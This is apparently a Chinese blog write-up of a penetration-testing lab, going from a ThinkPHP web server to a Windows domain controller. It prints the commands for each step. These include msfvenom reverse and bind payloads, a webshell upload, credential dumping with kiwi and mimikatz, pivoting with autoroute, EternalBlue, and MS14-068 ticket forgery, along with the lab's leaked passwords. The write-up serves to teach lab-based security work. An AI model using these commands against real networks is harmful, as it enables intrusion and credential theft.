![mLPrOgnQ_rCqn.gif](https://image.3001.net/images/20220929/1664417037_6334fd0d6abf91ffd0a34.gif!small)

**程序员写在文章前：**

最近，程序员小星在研究内网渗透，对部分内网靶场进行了测试，所以想和大家从测试过程、检测过程以及域渗透过程这3个方面来分享一下我在打内网靶场中的经历。

##  **准备工作**

本次内网网络拓扑图如下所示，首先将WEB的IP
192.168.0.150改为192.168.0.3。![image.png](https://image.3001.net/images/20220929/1664417038_6334fd0e313d948f2bc6e.png!small)

##  **（一）测试过程  
**

信息收集：

1\. 对目标IP进行端口扫描。  
sudo nmap -sS --open -Pn -p- -v 192.168.0.3

![image.png](https://image.3001.net/images/20220929/1664417039_6334fd0f09fb1a74dd326.png!small)

2.绑定hosts 192.168.0.3 www.webhack123.com ，访问网站首页出现一个thinkphp框架。

![image.png](https://image.3001.net/images/20220929/1664417039_6334fd0fcb4309308b611.png!small)

3.对网站进行目录扫描。

![image.png](https://image.3001.net/images/20220929/1664417040_6334fd10b038d18739f56.png!small)

4.存在wc.db将其下载下来，使用工具打开，里面存在网站目录文件信息，查看网站目录信息后，可以了解网站的基本架构。

![image.png](https://image.3001.net/images/20220929/1664417041_6334fd1197ccbec8ad5eb.png!small)

##  **（二）检测过程**

1\.
通过前面的信息搜集，已经知道当前网站是thinkphp框架了，使用工具扫描一下常见的漏洞,发现存在日志泄漏。![image.png](https://image.3001.net/images/20220929/1664417042_6334fd12a1a8e49e315bb.png!small)

2.在日志中泄漏了账号和密码的密文。

账号：admin

密文：74c774ef39b5b977c1fd59dbfc73c3e380a65aa3

![image.png](https://image.3001.net/images/20220929/1664417044_6334fd14bfcbbd2a85e0d.png!small)

3.通过解密获取密码明文web123。![image.png](https://image.3001.net/images/20220929/1664417046_6334fd1626b209c06c734.png!small)

4.前面对网站进行目录扫描，未发现网站管理后台，因此使用脚本来绑定 hosts 碰撞管理后台的子域名。

![image.png](https://image.3001.net/images/20220929/1664417046_6334fd16da7326e8bd55b.png!small)

5\. admin.webhack123.com就是网站的管理后台。

![image.png](https://image.3001.net/images/20220929/1664417047_6334fd17c4e319a900882.png!small)

6.使用前面获取的管理员账号密码进行登录，可以测试发现验证码是存在缺陷，也可以使用大字典来爆破出管理员的密码。

![image.png](https://image.3001.net/images/20220929/1664417048_6334fd18a885180b64361.png!small)

7.进入网站后台，修改允许上传的类型，上传一句话木马。

![image.png](https://image.3001.net/images/20220929/1664417049_6334fd197d88262a6363f.png!small)

8.使用蚁剑连接获取webshell。

![image.png](https://image.3001.net/images/20220929/1664417050_6334fd1a47f60de32adb3.png!small)

9\. 在当前主机先进行简单的信息搜集，当前用户为administrator且主机未安装杀软，存在双网卡192.168.0.0/24
10.10.10.0/24，存在域环境。

生成攻击载荷先上线msf：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=9999 -f
exe>haha.exe

![image.png](https://image.3001.net/images/20220929/1664417051_6334fd1bd30e808caf116.png!small)

10.迁移进程获取明文密码。

migrate 600

load kiwi

creds_all

![image.png](https://image.3001.net/images/20220929/1664417052_6334fd1cb06f42de4eb4f.png!small)

11.获取登录过当前主机的用户信息。

run post/windows/gather/enum_logged_on_users

![image.png](https://image.3001.net/images/20220929/1664417053_6334fd1d84907627d65ed.png!small)

12\. 可以看到存在hackbox域的域用户web，本地管理员Administrator的密码为：!@#Qwe456

前面我们已经知道存在域环境，现在定位到域控为：dc.hackbox.com 10.10.10.149。

![image.png](https://image.3001.net/images/20220929/1664417054_6334fd1e5ed0a533baea7.png!small)

##  **（三）域渗透过程**

1\. 前面知道该主机存在两个网卡,现在来对这两个网段的存活主机进行扫描，首先添加：

run autoroute -s 10.10.10.0/24

run autoroute -p

![image.png](https://image.3001.net/images/20220929/1664417055_6334fd1fbd6f7f80f121c.png!small)

2\. 对内网存活主机进行扫描，只存在10.10.10.149，也就是域控，且开放了445端口。

![image.png](https://image.3001.net/images/20220929/1664417056_6334fd20dda65b43e1f27.png!small)

3.使用永恒之蓝试打，检测出存在永恒之蓝漏洞。

![image.png](https://image.3001.net/images/20220929/1664417058_6334fd22083b169c90ad9.png!small)

4\. 反向shell失败原因未明，正向的shell是可以成功返回一个meterpreter，成功获取域控dc权限。  
![image.png](https://image.3001.net/images/20220929/1664417058_6334fd22bf5e96123f12f.png!small)

5\. 测试使用MS14-068漏洞：使用这个 exp 需要一个普通域控用户， web
是域用户，但不知道密码。前面获取到用户Administrator的密码为!@#Qwe456，现尝试使用用户web和这个密码进行登录。

![image.png](https://image.3001.net/images/20220929/1664417059_6334fd23896dd443d78eb.png!small)

6.登录失败，但是密码应该是正确的，只是不是远程组。

![image.png](https://image.3001.net/images/20220929/1664417060_6334fd2491074f2a9b7ad.png!small)

7\. #创建票据

ms14-068.exe -u web@hackbox.com -s
S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456

Load kiwi

#清理票据

kerberos_ticket_purge

![image.png](https://image.3001.net/images/20220929/1664417061_6334fd255ca51d3a2edb0.png!small)

8.上传 mimikatz 注入票据 mimikatz # kerberos::ptc TGT_web@hackbox.com.ccache。

![image.png](https://image.3001.net/images/20220929/1664417062_6334fd2646b0dbc2cfbc6.png!small)

9.查看票据 klist。

![image.png](https://image.3001.net/images/20220929/1664417063_6334fd27399bf09f816d6.png!small)

10.成功访问dc域控。

![image.png](https://image.3001.net/images/20220929/1664417064_6334fd281740e8c7d350d.png!small)

11.现在来获取域控权限，生成一个正向的载荷：

msfvenom -p windows/meterpreter/bind_tcp LPORT=9998 -f exe>bind.exe

copy命令复制到域控copy bind.exe \\\dc\c$。

![image.png](https://image.3001.net/images/20220929/1664417064_6334fd28e9355f080a561.png!small)  
12\. at命令执行计划任务运行bind.exe

net time [\\\dc](%5C%5Cdc)

at \\\dc 1:29:00 c:/bind.ex

![image.png](https://image.3001.net/images/20220929/1664417065_6334fd29a407fa04d8288.png!small)

13.成功获取域控权限。  
![image.png](https://image.3001.net/images/20220929/1664417066_6334fd2a806069c7a5573.png!small)

14.迁移进程抓取明文密码。  
![image.png](https://image.3001.net/images/20220929/1664417067_6334fd2b5006063c75354.png!small)

15.至此已经拿下了域控的权限。

![image.png](https://image.3001.net/images/20220929/1664417068_6334fd2c37e5faf6b09a8.png!small)

16.迁移到域管理员进程查看三个flag。

![image.png](https://image.3001.net/images/20220929/1664417069_6334fd2d0cc7dcff07493.png!small)

##  **（四）总结**

小星通过此次内网靶场测试的研究，加深了对内网系统的认识，熟练掌握了如何使用MSF完成整个打靶过程。下期，小星将使用Cobalstrick来完成打靶并以“黄金票据的利用”为题开展研究。

